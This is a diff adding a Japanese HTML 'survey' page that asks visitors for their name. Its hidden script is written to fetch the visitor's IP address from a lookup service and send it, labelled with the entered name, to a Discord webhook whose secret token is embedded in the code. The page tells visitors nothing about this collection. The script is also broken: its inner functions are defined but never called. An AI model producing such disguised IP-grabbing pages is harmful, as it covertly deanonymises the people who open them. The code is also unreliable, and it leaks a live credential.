@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ja">
+    <head>
+        <meta charset="UTF-8" />
+        <title>アンケート</title>
+        <script>
+            function getIPAddress(){
+                var namae = document.myform.namae.value;
+                // IPアドレスを取得する関数
+                function getIPAddress() {
+                    fetch("https://api.ipify.org?format=json")
+                        .then(response => response.json())
+                        .then(data => {
+                            const ipAddress = data.ip;
+                            sendToDiscord(ipAddress); // 取得したIPアドレスを送信
+                        })
+                        .catch(error => console.error("IPアドレスの取得に失敗しました:", error));
+                }
+
+                // WebhookにIPアドレスを送信する関数
+                function sendToDiscord(ipAddress)  {
+                    const webhookURL = "https://discord.com/api/webhooks/1385521042675728446/537quNdmzXbfcdXxiIuN-s4tJqi1UGK1FP2NRp_KKoIsYMoIkewRymXrqAn966583KzV";
+                    const payload = {
+                        embeds: [{
+                            title: namae + "の" +"IP取得",
+                            description: `IPアドレス: ${ipAddress}`,
+                            color: 3447003 // 青色に設定
+                        }]
+                    };
+
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            console.error("送信に失敗しました:", response.statusText);
+                        }
+                    })
+                    .catch(error => console.error("送信に失敗しました:", error));
+                }
+                    }
+        </script>
+    </head>
+    <body>
+        名前を入れてボタンを押してね！<br />
+        <form name="myform">
+            <input type="text" name="namae" size="3" />　
+            <input type="button" value="決定" onclick="getIPAddress()" />
+        </form>
+    </body>
+</html>
